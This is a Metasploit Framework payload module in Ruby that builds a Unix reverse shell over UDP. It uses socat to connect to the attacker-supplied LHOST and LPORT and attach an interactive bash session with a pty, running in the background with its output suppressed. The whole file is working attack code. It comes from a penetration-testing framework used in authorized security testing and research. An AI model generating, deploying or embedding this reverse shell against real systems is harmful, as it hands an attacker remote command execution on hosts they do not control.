##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 87

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'          => 'Unix Command Shell, Reverse UDP (via socat)',
     'Description'   => 'Creates an interactive shell via socat',
     'Author'        => 'RageLtMan <rageltman[at]sempervictus>',
     'License'       => MSF_LICENSE,
     'Platform'      => 'unix',
     'Arch'          => ARCH_CMD,
     'Handler'       => Msf::Handler::ReverseUdp,
     'Session'       => Msf::Sessions::CommandShell,
     'PayloadType'   => 'cmd',
     'RequiredCmd'   => 'socat',
     'Payload'       =>
       {
         'Offsets' => { },
         'Payload' => ''
       }
    ))
    register_advanced_options(
      [
        OptString.new('SocatPath', [true, 'The path to the Socat executable', 'socat']),
        OptString.new('BashPath', [true, 'The path to the Bash executable', 'bash'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    "#{datastore['SocatPath']} udp-connect:#{datastore['LHOST']}:#{datastore['LPORT']} exec:'#{datastore['BashPath']} -li',pty,stderr,sane 2>&1>/dev/null &"
  end

end
